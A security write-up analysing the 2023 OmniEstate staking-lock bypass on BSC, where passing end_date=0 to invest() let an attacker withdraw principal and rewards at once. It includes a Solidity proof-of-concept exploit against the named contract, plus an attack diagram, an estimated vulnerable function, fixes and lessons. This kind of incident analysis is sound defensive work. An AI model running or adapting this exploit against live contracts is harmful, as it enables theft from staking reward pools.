# OmniEstate — Staking Lock Period Bypass Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2023-01-18 |
| **Protocol** | OmniEstate (ORT Staking) |
| **Chain** | BSC |
| **Loss** | Unknown (~thousands USD) |
| **Attacker** | Unknown |
| **Attack Tx (invest)** | [0x49bed801...](https://bscscan.com/tx/0x49bed801b9a9432728b1939951acaa8f2e874453d39c7d881a62c2c157aa7613) |
| **Attack Tx (withdraw)** | [0xa916674f...](https://bscscan.com/tx/0xa916674fb8203fac6d78f5f9afc604be468a514aa61ea36c6d6ef26ecfbd0e97) |
| **Vulnerable Contract** | [0x6f40A3d0...](https://bscscan.com/address/0x6f40A3d0c89cFfdC8A1af212A019C220A295E9bB) |
| **Root Cause** | Passing `end_date=0` to `invest()` allows immediate withdrawal with no lock period |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/OmniEstate_exp.sol) |

---
## 1. Vulnerability Overview

OmniEstate's `invest()` function accepts an `end_date` parameter to set the staking lock period. However, passing `end_date=0` bypasses lock period validation, allowing an attacker to immediately call `withdrawAndClaim()` after staking to withdraw both principal and rewards simultaneously. This is a vulnerability caused by missing business logic validation.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no end_date validation
interface OmniStakingPool {
    function invest(uint256 end_date, uint256 qty_ort) external;
    function withdrawAndClaim(uint256 lockId) external;
}

// invest() internals (estimated)
function invest(uint256 end_date, uint256 qty_ort) external {
    // ❌ No check for end_date == 0
    // ❌ No validation that end_date is in the future relative to current block
    StakingInfo memory info = StakingInfo({
        amount: qty_ort,
        endDate: end_date,  // 0 is stored as-is
        claimed: false
    });
    userStakings[msg.sender].push(info);
    // Rewards calculated/granted immediately
}

// ✅ Fix
function invest(uint256 end_date, uint256 qty_ort) external {
    require(end_date > block.timestamp, "Invalid end date");  // ✅ Validation added
    require(end_date <= block.timestamp + MAX_LOCK_PERIOD, "Lock too long");
    // ...
}
```

### On-chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: passing `end_date=0` to `invest()` allows immediate withdrawal with no lock period
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─▶ Swap small amount of WBNB for ORT tokens (1 BNB)
  │
  ├─2─▶ OmniStakingPool.invest(end_date=0, qty_ort=1)
  │       end_date=0 → no lock period (validation missing)
  │       → creates a staking position that is immediately withdrawable
  │
  ├─3─▶ getUserStaking(attacker) → obtain lockId
  │
  ├─4─▶ OmniStakingPool.withdrawAndClaim(lockId)
  │       Immediately withdraw principal + rewards
  │       (should normally only be possible after lock period expires)
  │
  └─5─▶ Swap ORT → WBNB → realize profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function testExploit() public {
    // 1. Swap small amount of WBNB for ORT
    IWBNB(WBNB).deposit{value: 1e18}();
    bscSwap(address(WBNB), ORT, 1e18);

    // 2. Stake with end_date=0 → no lock period
    IERC20(ORT).approve(Omni, type(uint256).max);
    OmniStakingPool(Omni).invest(0, 1);  // ❌ Exploiting end_date=0

    // 3. Query staking ID
    uint256[] memory stake_ = OmniStakingPool(Omni).getUserStaking(address(this));

    // 4. Immediately withdraw → receive including rewards
    OmniStakingPool(Omni).withdrawAndClaim(stake_[0]);

    // 5. Swap ORT back to WBNB to realize profit
    bscSwap(ORT, address(WBNB), IERC20(ORT).balanceOf(address(this)));
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing Input Validation (Business Logic Flaw) |
| **Attack Vector** | Direct call with malformed parameter |
| **Impact Scope** | Staking reward pool |
| **DASP Classification** | Business Logic Flaw |
| **CWE** | CWE-20: Improper Input Validation |

## 6. Remediation Recommendations

1. **`end_date` range validation**: Enforce `end_date > block.timestamp` and minimum/maximum lock period constraints.
2. **Lock check on withdrawal**: Validate `block.timestamp >= endDate` inside `withdrawAndClaim()`.
3. **Prevent premature reward disbursement**: Do not calculate rewards until the lock period has fully elapsed.

## 7. Lessons Learned

- Time-based parameters in staking protocols must always be validated against an acceptable range.
- Inputs of `0` or boundary values should always be designed with potential abuse in mind.
- A simple missing parameter validation can expose an entire reward pool to exploitation.